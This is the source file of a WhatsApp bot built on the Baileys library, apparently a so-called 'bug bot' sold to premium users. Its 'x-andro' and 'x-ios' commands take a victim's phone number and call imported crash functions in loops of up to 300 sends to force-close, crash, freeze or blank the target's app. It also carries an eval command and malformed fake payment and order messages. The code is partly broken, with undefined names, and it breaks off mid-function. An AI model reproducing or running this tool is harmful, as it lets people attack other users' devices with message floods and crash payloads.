console.clear();
require('../Setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
const { InvisibleCall, Invisible, CrashIos, Warlock, DavaProtoDrainV1 } = require('../System/function.js');
//END
//MODULE MESSAGE + PREFIX

module.exports = exxxa = async (exxxa, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®�?+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®�?+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await exxxa.decodeJid(exxxa.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await exxxa.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚�? 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚�? 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const exxxaImg = fs.readFileSync(`./System/Thumb.jpg`)

if (!naze.public) {
if (!CreatorOnly) return
}
//- P -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣�? Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ �? SYSTEM - EXKSAA �? ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣�? Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//FUNCTION
async function loadingProgress(chat, quoted) {

const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let msg = await naze.sendMessage(chat, {
    text: frames[0]
  }, { quoted });

  for (let i = 0; i < frames.length; i++) {
    await naze.sendMessage(chat, {
      text: frames[i],
      edit: msg.key
    });
    await sleep(500);
  }

  await sleep(500);

  await naze.sendMessage(chat, {
    delete: msg.key
  });

}
// END FUNCTION BUG
const QontCtXksaa = {
            key: { 
                remoteJid: "13135550002@s.whatsapp.net", 
                participant: "13135550002@s.whatsapp.net",
                fromMe: false
            },
            message: {
                requestPaymentMessage: {
                currencyCodeIso4217: "USD", 
                amount1000: "999999999", 
                requestFrom: "0@s.whatsapp.net",
                noteMessage: { 
                    extendedTextMessage: { 
                    text: "? -#./exxxa" 
                } 
            },
            expiryTimestamp: "999999999",
            amount: { 
                value: "91929291929", 
                offset: "1000", 
                currencyCode: "INR" 
                }
            }
        }}

const MastrXxksaQotd = {
  key: {
	fromMe: false,
	  participant: "0@s.whatsapp.net",
		remoteJid: "status@broadcast"
	  },
		message: {
		  orderMessage: {
		  orderId: "2029",
		  thumbnail: exxxaImg, 
		    itemCount: `9999999`,
		    status: "INQUIRY",
		    surface: "CATALOG",
		    message: "-#./exxxa",
		    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
		  }
	    },
	    contextInfo: {
		  mentionedJid: [m.sender],
		  forwardingScore: 999,
          renderLargerThumbnail: true,
		  isForwarded: true
		}
	  }

const XksaaPly = (teks) => {
  return naze.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [m.chat],
        forwardingScore: 99999999,
        isForwarded: true,
        externalAdReply: {
          title: "-#./exxxa",
          body: "-#./exxxa",
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          thumbnailUrl: "https://files.catbox.moe/eej89g.jpg",
          sourceUrl: "https://t.me/PrinceExxxa"
        }
      }
    },
    { quoted: MastrXxksaQotd }
  );
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
await naze.sendMessage(m.chat, {
  interactiveMessage: {
     title: `─ Hello ${m.pushName}, My Name is ExksaaXChimera, I am an Automated Bot That Works To Help 

─ ! Information
- Author : https://ẉ.ceo/𝐄𝐗𝐊𝐒𝐀
- Script : Base Wa Bot
- Version : 1.0
- Runtime : ${runtime(process.uptime())}`, 
  footer: "-#./exxxa? yes I'm",
     image: { url: './System/exxxa.jpg' },
        nativeFlowMessage: {
           messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "-#./exxxa",
                url: "https://t.me/PrinceExxxa",
                copy_code: "-#./exxxa",
                 expiration_time: Date.now() * 999
                },
              bottom_sheet: {
                in_thread_buttons_limit: 2, 
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "-#./exxxa",
                 button_title: "-#./exxxa"
                },
              tap_target_configuration: {
                title: " X ",
                description: "bomboclard",
                canonical_url: "https://t.me/PrinceExxxa",
                domain: "shop.example.com",
                button_index: 0
              }
            }),
           buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "-#./exxxa",
                    sections: [
                {
                  title: "-#./Exksaa �? Bugs",
                  highlight_label: "-#./exxxa Bugs",
                  rows: [
                    {
                      title: "-#./exxxa Bugs",
                      description: "-#./exxxa Display Show Bugs",
                      id: "bugs"
                    }
                  ]
                },
                {
                  title: "-#./Ekxsaa �? Acces",
                  highlight_label: "-#./exxxa Acces",
                  rows: [
                    {
                      title: "-#.exxxa Acces",
                      description: "-#./exxxa Display Show Acces",
                      id: "acces"
                    }
                  ]
                },
                {
                  title: "-#./Ekxsaa �? Tools",
                  highlight_label: "-#./exxxa Tools",
                  rows: [
                    {
                      title: "-#.exxxa Tools",
                      description: "-#./exxxa Display Show Tools",
                      id: "funtools"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "-#./Exksaa Contact",
              url: "https://t.me/PrinceExxxa",
              merchant_url: "https://t.me/PrinceExxxa"
            })
          }
        ]
      }
    }
  }, { quoted: QontCtXksaa });
    
  await new Promise(resolve => setTimeout(resolve, 800))

  // 3️⃣ Kirim SOUND setelah menu
  await naze.sendMessage(m.chat, {
    audio: { url: './System/exxxa.mp3' },
    mimetype: 'audio/mpeg',
    ptt: true 
  }, { quoted: QontCtXksaa })
  break
}
//=======================\\
//===========case OwnMenu/Fun============\\
case 'acces': {
  await naze.sendMessage(m.chat, {
    interactiveMessage: {
      title: `─ Hello ${m.pushName}, My Name is ExksaaXChimera, I am an Automated Bot That Works To Help 

─ ! Information
- Author : https://ẉ.ceo/𝐄𝐗𝐊𝐒𝐀
- Script : -#./exxxa
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Owner Acces
- .addown [ 62xxx ]
- .delown [ 62xxx ]
- .addprem [ 62xxx ]
- .delprem [ 62xx ]
- .public
- .self 
`, 
      footer: "-#./exxxa? yes I'm",
      image: { url: './System/exxxa.jpg' },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "-#./exxxa",
            url: "t.me/PrinceExxxa",
            copy_code: "-#./exxxa",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2, 
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "-#./exxxa",
            button_title: "-#./exxxa"
          },
          tap_target_configuration: {
            title: " X ",
            description: "bomboclard",
            canonical_url: "https://t.me/PrinceExxxa",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "-#./exxxa",
                    sections: [
                {
                  title: "-#./Exksaa �? Back",
                  highlight_label: "-#./exxxa Menu",
                  rows: [
                    {
                      title: "-#./exxxa Back",
                      description: "-#./exxxa Display Back To Menu",
                      id: "menu"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "-#./Exksaa Contact",
              url: "https://t.me/PrinceExxxa",
              merchant_url: "https://t.me/PrinceExxxa"
            })
          }
        ]
      }
    }
  }, { quoted: QontCtXksaa });
  break;
}

case 'funtools': {
  await naze.sendMessage(m.chat, {
    interactiveMessage: {
      title: `─ Hello ${m.pushName}, My Name is ExksaaXChimera, I am an Automated Bot That Works To Help 

─ ! Information
- Author : https://ẉ.ceo/𝐄𝐗𝐊𝐒𝐀
- Script : -#./exxxa
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Owner Acces
- .
- .rvo
- .swgc
- .tiktok
- .toimg
- .
`, 
      footer: "-#./exxxa? yes I'm",
      image: { url: './System/exxxa.jpg' },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "-#./exxxa",
            url: "t.me/PrinceExxxa",
            copy_code: "-#./exxxa",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2, 
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "-#./exxxa",
            button_title: "-#./exxxa"
          },
          tap_target_configuration: {
            title: " X ",
            description: "bomboclard",
            canonical_url: "https://t.me/PrinceExxxa",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "-#./exxxa",
                    sections: [
                {
                  title: "-#./Exksaa �? Back",
                  highlight_label: "-#./exxxa Menu",
                  rows: [
                    {
                      title: "-#./exxxa Back",
                      description: "-#./exxxa Display Back To Menu",
                      id: "menu"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "-#./Exksaa Contact",
              url: "https://t.me/PrinceExxxa",
              merchant_url: "https://t.me/PrinceExxxa"
            })
          }
        ]
      }
    }
  }, { quoted: QontCtXksaa });
  break;
}

case 'bugs': {
  await naze.sendMessage(m.chat, {
    interactiveMessage: {
      title: `─ Hello ${m.pushName}, My Name is ExksaaXChimera, I am an Automated Bot That Works To Help 

─ ! Information
- Author : https://ẉ.ceo/𝐄𝐗𝐊𝐒𝐀
- Script : -#./exxxa
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Premium Acces
- .x-andro [ 62xxx ]
- .x-ios [ 62xxx ]
`, 
      footer: "-#./exxxa? yes I'm",
      image: { url: './System/exxxa.jpg' },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "-#./exxxa",
            url: "t.me/PrinceExxxa",
            copy_code: "-#./exxxa",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2, 
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "-#./exxxa",
            button_title: "-#./exxxa"
          },
          tap_target_configuration: {
            title: " X ",
            description: "bomboclard",
            canonical_url: "https://t.me/PrinceExxxa",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
              {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "call_permission_request",
                 buttonParamsJson: JSON.stringify({
                   has_multiple_buttons: true
                })
                },
                {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({      
                    title: "-#./exxxa",
                    sections: [
                {
                  title: "-#./Exksaa �? Back",
                  highlight_label: "-#./exxxa Menu",
                  rows: [
                    {
                      title: "-#./exxxa Back",
                      description: "-#./exxxa Display Back To Menu",
                      id: "menu"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "-#./Exksaa Contact",
              url: "https://t.me/PrinceExxxa",
              merchant_url: "https://t.me/PrinceExxxa"
            })
          }
        ]
      }
    }
  }, { quoted: QontCtXksaa });
  break;
}



case 'addowner': case 'addown':
if (!CreatorOnly) return XksaaPly("*Your Not Owner*")
  if (!args[0]) return XksaaPly(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await exxxa.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return XksaaPly(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  XksaaPly(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delowner': case 'delown':
if (!CreatorOnly) return XksaaPly("*Your Not Owner*")
  if (!args[0]) return XksaaPly(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  XksaaPly(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'addpremium': case 'addprem':
if (!CreatorOnly) return XksaaPly("*Your Not Owner*")
  if (!args[0]) return XksaaPly(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await exxxa.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return XksaaPly(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  XksaaPly(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delpremium': case 'delprem':
if (!CreatorOnly) return XksaaPly("*Your Not Owner*")
  if (!args[0]) return XksaaPly(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  XksaaPly(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'public': {
  if (!CreatorOnly) return XksaaPly("*You're Not My Owner*");

  naze.public = true;
  XksaaPly(`*Success: Changed Mode from Self to Public*`);
}
break;
//=======================\\
case 'self': case 'private': {
  if (!CreatorOnly) return XksaaPly("*You're Not My Owner*");

  naze.public = false;
  XksaaPly(`*Success: Changed Mode from Public to Self*`);
}
break;

case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return XksaaPly(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await XksaaPly(require('util').format(teks));
                }
            }
            break;

case "info": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  naze.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}
break;

case "swgrup": case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await naze.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    XksaaPly("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await naze.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    XksaaPly("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await naze.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    XksaaPly("Succes Add Status To Group")
                } else if (caption) {
                    await naze.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    XksaaPly("Succes Add Status To Group")
                } else {
                    await XksaaPly(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
//=======================\\
case 'x-andro':
case 'x-ios': {
    if (!PremOnly) return XksaaPly("*You are not a Premium User*");
    if (!q) return XksaaPly(`*Syntax Error*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return XksaaPly(`*Syntax Error*\nExample: ${command} 628xxx`);
    
    let target = `${jidx}@s.whatsapp.net`;
    let isAndroid = command === 'x-andro';

    let menuText = `
    ─ Hello ${m.pushName}, My Name is ExksaaXChimera, I am an Automated Bot That Works To Help 

─ ! Information
- Author : https://ẉ.ceo/𝐄𝐗𝐊𝐒𝐀
- Script : -#./exxxa
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Statuse Bugs
- -#./exxxa
- Target: ${target}
- Statuse: Ready
    `;

    let buttons = [{
        name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "-#./exxxa",
            sections: [{
                title: isAndroid ? "-#./Exksaa ? Android Bugs" : "-#./Exksaa ? iOS Bugs",
                highlight_label: "Bugs Menu",
                rows: isAndroid ? [
                    { title: "Force Close", description: "Force close android", id: `exxxa-force ${jidx}` },
                    { title: "Crash", description: "Crash android", id: `exxxa-crash ${jidx}` },
                    { title: "Delay Lock", description: "Delay lock Dozeer", id: `exxxa-delaylock ${jidx}` },
                    { title: "Delay Invis", description: "Delay invisible", id: `exxxa-delayinvis ${jidx}` },
                    { title: "Blank", description: "Blank screen", id: `exxxa-blank ${jidx}` }
                ] : [
                    { title: "Crash", description: "Crash iOS", id: `crashxios ${jidx}` },
                    { title: "Delay Invis", description: "Delay invisible", id: `delayinvisxios ${jidx}` },
                    { title: "Blank", description: "Blank screen", id: `blankxios ${jidx}` }
                ]
            }],
            has_multiple_buttons: true
        })
    }, {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
            display_text: "Contact",
            url: "https://t.me/PrinceExxxa"
        })
    }];

    await naze.sendMessage(m.chat, {
        interactiveMessage: {
            
                title: menuText,
                hasMediaAttachment: true,
                image: { url: "./System/exxxa.png" },
            
            footer: 
                "-#./exxxa? yes I'm"
            ,
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "-#./exxxa",
                        url: "t.me/PrinceExxxa",
                        copy_code: "-#./exxxa",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "-#./exxxa",
                        button_title: "-#./exxxa"
                    }
                }),
                buttons: buttons
            }
        }
    }, { quoted: QontCtXksaa });
    break;
}

case 'exxxa-force':
case 'exxxa-crash':
case 'exxxa-delaylock':
case 'exxxa-delayinvis':
case 'exxxa-blank': {
    if (!PremOnly) return NicReply("*You are not a Premium User*");
    if (!q) return NicReply(`*Syntax Error*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return NicReply(`*Syntax Error*\nExample: ${command} 628xxx`);

    let target = `${jidx}@s.whatsapp.net`;

    NicReply(`*Success! Send Bug to ${target}*`);

    if (command === 'exxxa-force') {
        for (let r = 0; r < 30; r++) {
            await CenatCenu(target);
            await sleep(100);
        }
    } else if (command === 'exxxa-crash') {
        for (let r = 0; r < 50; r++) {
            await InvisibleCall(target, Lolipop);
            await sleep(100);
        }
    } else if (command === 'exxxa-delaylock') {
        for (let r = 0; r < 100; r++) {
            await Warlock(target);
            await sleep(5000);
        }
    } else if (command === 'exxxa-delayinvis') {
        for (let r = 0; r < 300; r++) {
            await Invisible(target, Candy);
            await sleep(5000);
        }
    } else if (command === 'exxxa-blank') {
        for (let r = 0; r < 300; r++) {
            await LegacyX7(target);
            await sleep(100);
        }
    }

    console.log(chalk.red.bold("Success!"));
    break;
}


//======================\\

case "tiktok":
case "tt": {
    let momok = "`? ? ? ? ? ? - ? ? ? ? ? ? ? ?`";
    const q = args.join(" ")
if (!q) return XksaaPly("url nya mana bwangg")
if (!q.includes("tiktok.com")) return XksaaPly("Itu bukan link tiktok bwangg")
    
    await naze.sendMessage(m.chat, { react: { text: "?", key: m.key } });
    
    try {
        // Fungsi formatNumber
        function formatNumber(integer) {
            let numb = parseInt(integer);
            return Number(numb).toLocaleString().replace(/,/g, '.');
        }
        
        // Fungsi formatDate
        function formatDate(n, locale = 'en') {
            let d = new Date(n * 1000);
            return d.toLocaleDateString(locale, {
                weekday: 'long',
                day: 'numeric',
                month: 'long',
                year: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                second: 'numeric'
            });
        }
        
        // Request ke API
        let domain = 'https://www.tikwm.com/api/';
        let res = await (await axios.post(domain, {}, {
            headers: {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.tikwm.com',
                'Referer': 'https://www.tikwm.com/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            },
            params: {
                url: q,
                count: 12,
                cursor: 0,
                web: 1,
                hd: 1
            }
        })).data.data;
        
        if (!res) {
            return XksaaPly("Gagal mengambil data!");
        }
        
        // Proses data
        let data = [];
        if (res?.duration == 0) {
            res.images.map(v => {
